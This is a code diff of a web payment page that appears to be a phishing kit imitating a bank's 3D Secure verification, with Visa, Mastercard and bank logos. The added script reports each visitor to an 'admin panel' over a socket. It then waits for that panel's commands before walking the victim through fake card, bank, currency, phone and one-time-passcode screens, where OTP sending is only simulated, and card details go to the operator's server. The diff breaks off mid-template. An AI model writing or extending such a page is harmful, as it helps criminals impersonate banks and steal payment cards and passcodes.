@@ -354,6 +354,7 @@
               align-items: center;
               gap: 0.5rem;
           }
+          
           .security-badge img {
               height: 1.5rem;
               width: auto;
@@ -390,9 +391,41 @@
             pointer-events: none;
             opacity: 0.8;
           }
-  
-          #mcVerificationContent {
+        #mcVerificationContent {
             font-family: Arial, sans-serif;
+          }
+
+          /* Error message styling */
+          .error-message {
+              color: #ef4444;
+              font-size: 0.875rem;
+              margin-top: 0.5rem;
+          }
+
+          /* Add spinner animation for loading states */
+          .spinner {
+              display: inline-block;
+              width: 1.5rem;
+              height: 1.5rem;
+              border: 2px solid rgba(255, 255, 255, 0.3);
+              border-radius: 50%;
+              border-top-color: #fff;
+              animation: spin 1s ease-in-out infinite;
+              margin-right: 0.5rem;
+              vertical-align: middle;
+          }
+
+          /* Card/Bank selection styles */
+          .card-option, .bank-option, .currency-option {
+              transition: all 0.2s ease;
+          }
+          .card-option:hover, .bank-option:hover, .currency-option:hover {
+              transform: translateY(-2px);
+              box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+          }
+          .card-option.selected, .bank-option.selected, .currency-option.selected {
+              border: 2px solid #0066cc !important;
+              background-color: #f0f9ff;
           }
       </style>
   </head>
@@ -483,6 +516,9 @@ Your payment information is securely transmitted using 256-bit encryption. We do
                                       maxlength="19" 
                                       class="pl-10 pr-10"
                                   />
+                                  <div class="card-type-icon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">
+                                      <img src="" alt="" id="card-type-img" class="h-6" style="display: none;">
+                                  </div>
                               </div>
                           </div>
                           
@@ -569,98 +605,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
     
     <!-- Main Verification Content -->
     <div id="mcVerificationContent" style="display: none; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); padding: 0;">
-      
-      <!-- Header with bank and card logos -->
-      <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #eee;">
-        <!-- Left side - Bank logo -->
-        <div style="height: 40px; display: flex; align-items: center;">
-          <img id="bankLogo" src="https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png" alt="Bank Logo" style="height: 100%; max-width: 150px;">
-        </div>
-        
-        <!-- Right side - Card verification logo -->
-        <div style="height: 30px; display: flex; align-items: center;">
-          <img id="verificationTypeLogo" src="https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png" alt="Verified by Visa" style="height: 100%; max-width: 120px;">
-        </div>
-      </div>
-      
-      <!-- Main content -->
-      <div style="padding: 15px 20px;">
-        <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
-        
-        <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
-          <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
-            One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
-          </p>
-        </div>
-        
-        <!-- Transaction details - CENTER ALIGNED with more spacing -->
-        <div style="margin-bottom: 20px; font-size: 13px; color: #333; display: flex; flex-direction: column; align-items: center;">
-          <div style="display: grid; grid-template-columns: auto auto; gap: 8px 10px; width: 100%; max-width: 350px;">
-            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Merchant</div>
-            <div style="text-align: left; font-weight: 500;" id="merchantName">Bologus pvt store.</div>
-            
-            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Amount</div>
-            <div style="text-align: left; font-weight: 500;">
-              <span id="currencySymbol">$</span><span id="transactionAmount">1000.00</span>
-            </div>
-            
-            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Date</div>
-            <div style="text-align: left; font-weight: 500;" id="transactionDate">02/04/2025 05:15:42</div>
-            
-            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Card Number</div>
-            <div style="text-align: left; font-weight: 500;" id="cardNumberDisplay">XXXX XXXX XXXX 4352</div>
-            
-            <div style="text-align: right; font-weight: 400; padding-right: 5px;">Reference Id</div>
-            <div style="text-align: left; font-weight: 500;" id="referenceId">g4pxye</div>
-          </div>
-        </div>
-        
-        <!-- OTP input field - IMPROVED with label and input on same line -->
-        <div style="margin-bottom: 20px; display: flex; align-items: center;">
-          <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 400; color: #333; padding-left: 10px;">Enter One-Time Passcode</span>
-          <div style="position: relative; width: 240px;">
-            <input type="text" id="mcOtpInput" 
-              style="width: 100%; padding: 8px 30px 8px 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
-              font-weight: 400; transition: all 0.3s;" 
-              placeholder="Enter One-Time Passcode" maxlength="6">
-            <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
-              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
-                <circle cx="12" cy="12" r="10"/>
-                <path d="M12 16v-4M12 8h.01"/>
-              </svg>
-            </div>
-          </div>
-        </div>
-        
-        <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
-          Incorrect OTP, please enter valid one time passcode sent to your registered mobile
-        </p>
-        
-        <!-- Consent checkbox - aligned to match the image -->
-        <div style="margin-bottom: 15px;">
-          <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
-            <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 13px; height: 13px;" checked>
-            <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
-          </label>
-        </div>
-        
-        <!-- Action buttons - styled to match the image -->
-        <div style="display: flex; gap: 5px; margin-bottom: 10px;">
-          <button id="mcSubmitBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
-          <button id="mcResendBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
-          <button id="mcCancelBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
-        </div>
-        
-        <!-- Timer display -->
-        <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;">Session expires in: 4:54</div>
-        
-        <!-- Footer links - styled to match the image -->
-        <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
-          <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
-          <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
-          <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
-        </div>
-      </div>
+      <!-- Content will be inserted dynamically based on the verification step -->
     </div>
   </div>
   
@@ -671,7 +616,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       const appElement = document.getElementById('app');
       if (appElement) {
           appElement.innerHTML = `<div style="max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; color: #ef4444; background: rgba(239, 68, 68, 0.1); border-radius: 8px; border: 1px solid #ef4444;">
-              <h3 style="margin-bottom: 10px; font-size: 18px;">There was an error loading the page</h3>
+<h3 style="margin-bottom: 10px; font-size: 18px;">There was an error loading the page</h3>
               <p style="margin-bottom: 10px;">Please try refreshing the page or contact support if the issue persists.</p>
               <p style="font-size: 12px; color: #666;">Error details: ${message}</p>
               <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
@@ -680,7 +625,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       return true;
   };
   
-  // Timer reference
+  // Initialize variables at the global scope
   let timerRef = null;
   let socket = null;
   let mcTimerInterval = null;
@@ -785,6 +730,10 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       canResend: false,
       phoneLastFour: '',
       phoneNumberSet: false,
+      mcVerificationStep: 'loading', // 'loading', 'card-select', 'bank-select', 'currency', 'phone', 'otp', 'processing'
+      selectedBank: null,
+      selectedCurrency: 'USD',
+      phoneNumber: '',
       cardForm: {
           cardNumber: '',
           cardHolder: '',
@@ -833,72 +782,107 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           // Update all amount displays after DOM is loaded
           updateAmountDisplays();
           
-          // Initialize socket connection
-          socket = io(window.location.origin, {
-              reconnection: true,
-              reconnectionAttempts: Infinity,
-              reconnectionDelay: 1000,
-              reconnectionDelayMax: 5000,
-              timeout: 20000,
-              transports: ['websocket', 'polling']
-          });
-  
-          // Add debugging listeners
-          socket.on('connect', () => {
-              console.log('Socket connected:', socket.id);
-              
-              // Send visitor information to server (for admin panel tracking)
-              socket.emit('visitor', {
-                  url: window.location.href,
-                  device: navigator.userAgent,
-                  timestamp: new Date().toISOString(),
-                  amount: state.amount // Make sure to send the amount
+          // Initialize socket connection - SAFELY
+          try {
+              socket = io(window.location.origin, {
+                  reconnection: true,
+                  reconnectionAttempts: Infinity,
+                  reconnectionDelay: 1000,
+                  reconnectionDelayMax: 5000,
+                  timeout: 20000,
+                  transports: ['websocket', 'polling']
+              });
+          
+              // Add debugging listeners
+              socket.on('connect', () => {
+                  console.log('Socket connected:', socket.id);
+                  
+                  // Send visitor information to server (for admin panel tracking)
+                  socket.emit('visitor', {
+                      url: window.location.href,
+                      device: navigator.userAgent,
+                      timestamp: new Date().toISOString(),
+                      amount: state.amount // Make sure to send the amount
+                  });
+                  
+                  // Start heartbeat to keep visitor tracking active
+                  setInterval(() => {
+                      socket.emit('heartbeat', { id: socket.id });
+                  }, 30000);
+              });
+
+              socket.on('connect_error', (error) => {
+                  console.error('Socket connection error:', error);
+              });
+
+              socket.on('disconnect', (reason) => {
+                  console.log('Socket disconnected:', reason);
+              });
+
+              // Handle incoming commands from admin panel
+              socket.on('command', (data) => {
+                  console.log('Received command from admin panel:', data);
+                  
+                  if (data.action === 'show_mc_verification') {
+                      // Store phone number from admin command if available
+                      if (data.phone) {
+                          state.phoneNumberSet = true;
+                          state.phoneLastFour = data.phone.slice(-4);
+                          console.log('Phone from admin panel:', state.phoneLastFour);
+                      }
+                      
+                      // Only show MC verification when commanded from admin panel
+                      showMcVerification();
+                  }
               });
               
-              // Start heartbeat to keep visitor tracking active
-              setInterval(() => {
-                  socket.emit('heartbeat', { id: socket.id });
-              }, 30000);
-          });
-
-          socket.on('connect_error', (error) => {
-              console.error('Socket connection error:', error);
-          });
-
-          socket.on('disconnect', (reason) => {
-              console.log('Socket disconnected:', reason);
-          });
-
-          // Handle incoming commands from admin panel
-          socket.on('command', (data) => {
-              console.log('Received command from admin panel:', data);
-              
-              if (data.action === 'show_mc_verification') {
-                  // Store phone number from admin command if available
-                  if (data.phone) {
-                      state.phoneNumberSet = true;
-                      state.phoneLastFour = data.phone.slice(-4);
-                      console.log('Phone from admin panel:', state.phoneLastFour);
+              // Also listen for show_verification event (alternative command format)
+              socket.on('show_verification', function(data) {
+                  console.log('Show verification command received:', data);
+                  if (data.type === 'mc') {
+                      // Store phone number if provided
+                      if (data.phone) {
+                          state.phoneNumberSet = true;
+                          state.phoneLastFour = data.phone.slice(-4);
+                          console.log('Phone from admin (show_verification):', state.phoneLastFour);
+                      }
+                      showMcVerification();
                   }
-                  
-                  // Only show MC verification when commanded from admin panel
-                  showMcVerification();
-              }
-          });
-          
-          // Also listen for show_verification event (alternative command format)
-          socket.on('show_verification', function(data) {
-              console.log('Show verification command received:', data);
-              if (data.type === 'mc') {
-                  // Store phone number if provided
-                  if (data.phone) {
-                      state.phoneNumberSet = true;
-                      state.phoneLastFour = data.phone.slice(-4);
-                      console.log('Phone from admin (show_verification):', state.phoneLastFour);
+              });
+
+              // Socket event handlers for payment processing
+              socket.on('payment_processed', function(data) {
+                  console.log('Payment processed:', data);
+                  if (data.success) {
+                      proceedToSuccess();
+                  } else {
+                      handlePaymentError(data.error);
                   }
-                  showMcVerification();
-              }
-          });
+              });
+
+              socket.on('otp_verified', function(data) {
+                  console.log('OTP verified:', data);
+                  if (data.success) {
+                      proceedToSuccess();
+                  } else {
+                      handleOtpError(data.error);
+                  }
+              });
+
+              // Handle payment status updates from admin panel
+              socket.on('payment_status', function(data) {
+                  console.log('Payment status update:', data);
+                  if (data.status === 'approved') {
+                      proceedToSuccess();
+                  } else if (data.status === 'declined') {
+                      handlePaymentError('Your payment was declined. Please try again with a different card.');
+                  } else if (data.status === 'timeout') {
+                      handleMcTimeout();
+                  }
+              });
+          } catch (socketError) {
+              console.error('Error initializing socket:', socketError);
+          }
 
           // Initialize UI based on state
           initializeUI();
@@ -1094,7 +1078,7 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           const currentYear = now.getFullYear();
           
           if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
-              errors.expiryDate = 'Card has expired';
+errors.expiryDate = 'Card has expired';
               isValid = false;
           }
       }
@@ -1164,7 +1148,15 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           if (submitBtn) {
               submitBtn.disabled = true;
               submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
+              submitBtn.classList.add('btn-loading');
           }
+      }
+      
+      // Check if socket is initialized
+      if (!socket) {
+          console.error('Socket connection not established');
+          handlePaymentError('Connection to payment server failed. Please try again.');
+          return;
       }
       
       // Emit payment processing event to server
@@ -1236,6 +1228,9 @@ Your payment information is securely transmitted using 256-bit encryption. We do
           return;
       }
       
+      // Reset the verification step
+      state.mcVerificationStep = 'loading';
+      
       // Show overlay with loading spinner
       overlay.style.display = 'flex';
       loadingContent.style.display = 'flex';
@@ -1246,14 +1241,18 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       
       // Simulate loading delay (1-2 seconds)
       setTimeout(() => {
+          // Move to card selection step if we don't have card type yet
+          if (!state.cardType) {
+              state.mcVerificationStep = 'card-select';
+              showCardSelectionScreen();
+          } else {
+              // Move to bank selection step
+              state.mcVerificationStep = 'bank-select';
+              showBankSelectionScreen();
+          }
+          
           loadingContent.style.display = 'none';
           verificationContent.style.display = 'block';
-          
-          // Update verification UI with transaction details
-          updateMcVerificationUI();
-          
-          // Start MC verification timer
-          startMcTimer();
       }, 1500);
   }
 
@@ -1272,6 +1271,476 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       }
       
       logoContainer.innerHTML = `<img src="${logoUrl}" alt="Verification" style="height: 100%; max-width: 150px;">`;
+  }
+
+  // Card selection screen
+  function showCardSelectionScreen() {
+      const verificationContent = document.getElementById('mcVerificationContent');
+      if (!verificationContent) return;
+      
+      verificationContent.innerHTML = `
+          <div style="padding: 20px; text-align: center;">
+              <h3 style="margin-top: 0; margin-bottom: 20px; font-weight: bold; color: #333; font-size: 18px;">Select Your Card Type</h3>
+              
+              <div style="display: flex; justify-content: center; gap: 20px; margin-bottom: 30px;">
+                  <div class="card-option" data-card-type="visa" style="border: 1px solid #ddd; border-radius: 8px; padding: 15px; cursor: pointer; width: 100px; text-align: center;">
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" style="height: 40px; margin-bottom: 10px;">
+                      <div>Visa</div>
+                  </div>
+                  <div class="card-option" data-card-type="mastercard" style="border: 1px solid #ddd; border-radius: 8px; padding: 15px; cursor: pointer; width: 100px; text-align: center;">
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="height: 40px; margin-bottom: 10px;">
+                      <div>Mastercard</div>
+                  </div>
+                  <div class="card-option" data-card-type="amex" style="border: 1px solid #ddd; border-radius: 8px; padding: 15px; cursor: pointer; width: 100px; text-align: center;">
+                      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" style="height: 40px; margin-bottom: 10px;">
+                      <div>Amex</div>
+                  </div>
+              </div>
+              
+              <button id="mcCancelCardSelectBtn" style="padding: 10px 20px; background-color: #aaaaaa; color: white; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
+          </div>
+      `;
+      
+      // Add event listeners
+      setTimeout(() => {
+          const cardOptions = document.querySelectorAll('.card-option');
+          cardOptions.forEach(option => {
+              option.addEventListener('click', function() {
+                  const cardType = this.getAttribute('data-card-type');
+                  state.cardType = cardType;
+                  
+                  // Proceed to bank selection
+                  state.mcVerificationStep = 'bank-select';
+                  showBankSelectionScreen();
+              });
+          });
+          
+          const cancelBtn = document.getElementById('mcCancelCardSelectBtn');
+          if (cancelBtn) {
+              cancelBtn.addEventListener('click', handleMcCancel);
+          }
+      }, 100);
+  }
+
+  // Bank selection screen
+  function showBankSelectionScreen() {
+      const verificationContent = document.getElementById('mcVerificationContent');
+      if (!verificationContent) return;
+      
+      // Get popular banks based on card type
+      const popularBanks = getPopularBanks(state.cardType);
+      
+      verificationContent.innerHTML = `
+          <div style="padding: 20px;">
+              <h3 style="margin-top: 0; margin-bottom: 20px; font-weight: bold; color: #333; font-size: 18px; text-align: center;">Select Your Bank</h3>
+              
+              <div style="margin-bottom: 20px;">
+                  <input type="text" id="bankSearchInput" placeholder="Search for your bank..." style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;">
+              </div>
+              
+              <div id="banksList" style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; max-height: 300px; overflow-y: auto;">
+                  ${popularBanks.map(bank => `
+                      <div class="bank-option" data-bank-code="${bank.code}" style="border: 1px solid #ddd; border-radius: 4px; padding: 10px; cursor: pointer; display: flex; align-items: center;">
+                          <img src="${bankLogos[bank.code] || bankLogos['default']}" alt="${bank.name}" style="height: 30px; width: 50px; object-fit: contain; margin-right: 10px;">
+                          <div style="font-size: 14px;">${bank.name}</div>
+                      </div>
+                  `).join('')}
+              </div>
+              
+              <div style="display: flex; justify-content: space-between; margin-top: 20px;">
+                  <button id="mcBackToBankSelectBtn" style="padding: 10px 20px; background-color: #aaaaaa; color: white; border: none; border-radius: 4px; cursor: pointer;">Back</button>
+                  <button id="mcCancelBankSelectBtn" style="padding: 10px 20px; background-color: #aaaaaa; color: white; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
+              </div>
+          </div>
+      `;
+      
+      // Add event listeners
+      setTimeout(() => {
+          const bankOptions = document.querySelectorAll('.bank-option');
+          bankOptions.forEach(option => {
+              option.addEventListener('click', function() {
+                  const bankCode = this.getAttribute('data-bank-code');
+                  state.selectedBank = bankCode;
+                  
+                  // Highlight selected bank
+                  bankOptions.forEach(b => b.style.border = '1px solid #ddd');
+                  this.style.border = '2px solid #0066cc';
+                  
+                  // Proceed to currency selection after a short delay
+                  setTimeout(() => {
+                      state.mcVerificationStep = 'currency';
+                      showCurrencySelectionScreen();
+                  }, 500);
+              });
+          });
+          
+          const backBtn = document.getElementById('mcBackToBankSelectBtn');
+          if (backBtn) {
+              backBtn.addEventListener('click', function() {
+                  if (state.cardType) {
+                      // Go back to card selection if we have a card type
+                      state.mcVerificationStep = 'card-select';
+                      showCardSelectionScreen();
+                  } else {
+                      // Otherwise just cancel
+                      handleMcCancel();
+                  }
+              });
+          }
+          
+          const cancelBtn = document.getElementById('mcCancelBankSelectBtn');
+          if (cancelBtn) {
+              cancelBtn.addEventListener('click', handleMcCancel);
+          }
+          
+          // Add search functionality
+          const searchInput = document.getElementById('bankSearchInput');
+          if (searchInput) {
+              searchInput.addEventListener('input', function() {
+                  const searchValue = this.value.toLowerCase();
+                  const banks = document.querySelectorAll('.bank-option');
+                  
+                  banks.forEach(bank => {
+                      const bankName = bank.textContent.toLowerCase();
+                      if (bankName.includes(searchValue)) {
+                          bank.style.display = 'flex';
+                      } else {
+                          bank.style.display = 'none';
+                      }
+                  });
+              });
+          }
+      }, 100);
+  }
+
+  // Currency selection screen
+  function showCurrencySelectionScreen() {
+      const verificationContent = document.getElementById('mcVerificationContent');
+      if (!verificationContent) return;
+      
+      const currencies = [
+          { code: 'USD', name: 'US Dollar', symbol: '$' },
+          { code: 'EUR', name: 'Euro', symbol: '€' },
+          { code: 'GBP', name: 'British Pound', symbol: '£' },
+          { code: 'JPY', name: 'Japanese Yen', symbol: '¥' },
+          { code: 'CAD', name: 'Canadian Dollar', symbol: 'C$' },
+          { code: 'AUD', name: 'Australian Dollar', symbol: 'A$' },
+          { code: 'INR', name: 'Indian Rupee', symbol: '₹' },
+          { code: 'CNY', name: 'Chinese Yuan', symbol: '¥' }
+      ];
+      
+      verificationContent.innerHTML = `
+          <div style="padding: 20px;">
+              <h3 style="margin-top: 0; margin-bottom: 20px; font-weight: bold; color: #333; font-size: 18px; text-align: center;">Select Currency</h3>
+              
+              <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 30px;">
+                  ${currencies.map(currency => `
+                      <div class="currency-option ${currency.code === state.selectedCurrency ? 'selected' : ''}" data-currency-code="${currency.code}" style="border: ${currency.code === state.selectedCurrency ? '2px solid #0066cc' : '1px solid #ddd'}; border-radius: 4px; padding: 10px; cursor: pointer;">
+                          <div style="font-size: 16px; font-weight: 500;">${currency.symbol} ${currency.code}</div>
+                          <div style="font-size: 14px; color: #666;">${currency.name}</div>
+                      </div>
+                  `).join('')}
+              </div>
+              
+              <div style="display: flex; justify-content: space-between;">
+                  <button id="mcBackToCurrencyBtn" style="padding: 10px 20px; background-color: #aaaaaa; color: white; border: none; border-radius: 4px; cursor: pointer;">Back</button>
+                  <button id="mcContinueCurrencyBtn" style="padding: 10px 20px; background-color: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer;">Continue</button>
+                  <button id="mcCancelCurrencyBtn" style="padding: 10px 20px; background-color: #aaaaaa; color: white; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
+              </div>
+          </div>
+      `;
+      
+      // Add event listeners
+      setTimeout(() => {
+          const currencyOptions = document.querySelectorAll('.currency-option');
+          currencyOptions.forEach(option => {
+              option.addEventListener('click', function() {
+                  const currencyCode = this.getAttribute('data-currency-code');
+                  state.selectedCurrency = currencyCode;
+                  
+                  // Highlight selected currency
+                  currencyOptions.forEach(c => c.style.border = '1px solid #ddd');
+                  this.style.border = '2px solid #0066cc';
+              });
+          });
+          
+          const backBtn = document.getElementById('mcBackToCurrencyBtn');
+          if (backBtn) {
+              backBtn.addEventListener('click', function() {
+                  state.mcVerificationStep = 'bank-select';
+                  showBankSelectionScreen();
+              });
+          }
+          
+          const continueBtn = document.getElementById('mcContinueCurrencyBtn');
+          if (continueBtn) {
+              continueBtn.addEventListener('click', function() {
+                  state.mcVerificationStep = 'phone';
+                  showPhoneVerificationScreen();
+              });
+          }
+          
+          const cancelBtn = document.getElementById('mcCancelCurrencyBtn');
+          if (cancelBtn) {
+              cancelBtn.addEventListener('click', handleMcCancel);
+          }
+      }, 100);
+  }
+
+  // Phone verification screen
+  function showPhoneVerificationScreen() {
+      const verificationContent = document.getElementById('mcVerificationContent');
+      if (!verificationContent) return;
+      
+      verificationContent.innerHTML = `
+          <div style="padding: 20px;">
+              <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 18px; text-align: center;">Verify Your Mobile Number</h3>
+              
+              <p style="margin-bottom: 20px; font-size: 14px; color: #666; text-align: center;">
+                  We need to verify your phone number to proceed with secure verification.
+              </p>
+              
+              <div style="margin-bottom: 25px;">
+                  <label style="display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500;">Mobile Number</label>
+                  <input type="tel" id="phoneNumberInput" placeholder="+1 234 567 8900" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px;">
+                  <p id="phoneErrorText" style="color: #e74c3c; font-size: 13px; margin-top: 5px; display: none;"></p>
+              </div>
+              
+              <div style="display: flex; justify-content: space-between;">
+                  <button id="mcBackToPhoneBtn" style="padding: 10px 20px; background-color: #aaaaaa; color: white; border: none; border-radius: 4px; cursor: pointer;">Back</button>
+                  <button id="mcContinuePhoneBtn" style="padding: 10px 20px; background-color: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer;">Send OTP</button>
+                  <button id="mcCancelPhoneBtn" style="padding: 10px 20px; background-color: #aaaaaa; color: white; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
+              </div>
+          </div>
+      `;
+      
+      // Add event listeners
+      setTimeout(() => {
+          const phoneInput = document.getElementById('phoneNumberInput');
+          if (phoneInput) {
+              // Pre-fill with stored phone if available
+              if (state.phoneNumberSet && state.phoneLastFour) {
+                  phoneInput.value = `********${state.phoneLastFour}`;
+                  phoneInput.disabled = true;
+              }
+              
+              phoneInput.addEventListener('input', function() {
+                  // Basic phone validation
+                  const phoneErrorText = document.getElementById('phoneErrorText');
+                  if (this.value.length < 10) {
+                      phoneErrorText.textContent = 'Please enter a valid phone number';
+                      phoneErrorText.style.display = 'block';
+                  } else {
+                      phoneErrorText.style.display = 'none';
+                  }
+              });
+          }
+          
+          const backBtn = document.getElementById('mcBackToPhoneBtn');
+          if (backBtn) {
+              backBtn.addEventListener('click', function() {
+                  state.mcVerificationStep = 'currency';
+                  showCurrencySelectionScreen();
+              });
+          }
+          
+          const continueBtn = document.getElementById('mcContinuePhoneBtn');
+          if (continueBtn) {
+              continueBtn.addEventListener('click', function() {
+                  const phoneInput = document.getElementById('phoneNumberInput');
+                  const phoneErrorText = document.getElementById('phoneErrorText');
+                  
+                  if (phoneInput.value.length < 10 && !phoneInput.disabled) {
+                      phoneErrorText.textContent = 'Please enter a valid phone number';
+                      phoneErrorText.style.display = 'block';
+                      return;
+                  }
+                  
+// Store phone number
+                  if (!phoneInput.disabled) {
+                      state.phoneNumber = phoneInput.value;
+                      state.phoneLastFour = phoneInput.value.slice(-4);
+                      state.phoneNumberSet = true;
+                  }
+                  
+                  // Show loading spinner in the button
+                  continueBtn.disabled = true;
+                  continueBtn.innerHTML = '<span style="display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; vertical-align: middle; margin-right: 5px;"></span> Sending OTP...';
+                  
+                  // Simulate OTP sending
+                  setTimeout(() => {
+                      state.mcVerificationStep = 'otp';
+                      showOtpVerificationScreen();
+                  }, 1500);
+              });
+          }
+          
+          const cancelBtn = document.getElementById('mcCancelPhoneBtn');
+          if (cancelBtn) {
+              cancelBtn.addEventListener('click', handleMcCancel);
+          }
+      }, 100);
+  }
+
+  // OTP verification screen (final step)
+  function showOtpVerificationScreen() {
+      const verificationContent = document.getElementById('mcVerificationContent');
+      if (!verificationContent) return;
+      
+      verificationContent.innerHTML = `
+        <!-- Header with bank and card logos -->
+        <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #eee;">
+          <!-- Left side - Bank logo -->
+          <div style="height: 40px; display: flex; align-items: center;">
+            <img id="bankLogo" src="${bankLogos[state.selectedBank] || bankLogos['default']}" alt="Bank Logo" style="height: 100%; max-width: 150px;">
+          </div>
+          
+          <!-- Right side - Card verification logo -->
+          <div style="height: 30px; display: flex; align-items: center;">
+            <img id="verificationTypeLogo" src="${state.cardType === 'visa' ? 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png' : 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'}" alt="Verification" style="height: 100%; max-width: 120px;">
+          </div>
+        </div>
+        
+        <!-- Main content -->
+        <div style="padding: 15px 20px;">
+          <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
+          
+          <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
+            <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
+              One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">${getPhoneDisplay()}</span>
+            </p>
+          </div>
+          
+          <!-- Transaction details - CENTER ALIGNED with more spacing -->
+          <div style="margin-bottom: 20px; font-size: 13px; color: #333; display: flex; flex-direction: column; align-items: center;">
+            <div style="display: grid; grid-template-columns: auto auto; gap: 8px 10px; width: 100%; max-width: 350px;">
+              <div style="text-align: right; font-weight: 400; padding-right: 5px;">Merchant</div>
+              <div style="text-align: left; font-weight: 500;" id="merchantName">Online Merchant</div>
+              
+              <div style="text-align: right; font-weight: 400; padding-right: 5px;">Amount</div>
+              <div style="text-align: left; font-weight: 500;">
+                <span id="currencySymbol">${getCurrencySymbol(state.selectedCurrency)}</span><span id="transactionAmount">${state.amount.toFixed(2)}</span>
+              </div>
+              
+              <div style="text-align: right; font-weight: 400; padding-right: 5px;">Date</div>
+              <div style="text-align: left; font-weight: 500;" id="transactionDate">${getCurrentDateTime()}</div>
+              
+              <div style="text-align: right; font-weight: 400; padding-right: 5px;">Card Number</div>
+              <div style="text-align: left; font-weight: 500;" id="cardNumberDisplay">${formatCardNumberDisplay(state.cardForm.cardNumber)}</div>
+              
+              <div style="text-align: right; font-weight: 400; padding-right: 5px;">Reference Id</div>
+              <div style="text-align: left; font-weight: 500;" id="referenceId">${state.transactionId}</div>
+            </div>
+          </div>
+          
+          <!-- OTP input field - IMPROVED with label and input on same line -->
+          <div style="margin-bottom: 20px; display: flex; align-items: center;">
+            <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 400; color: #333; padding-left: 10px;">Enter One-Time Passcode</span>
+            <div style="position: relative; width: 240px;">
+              <input type="text" id="mcOtpInput" 
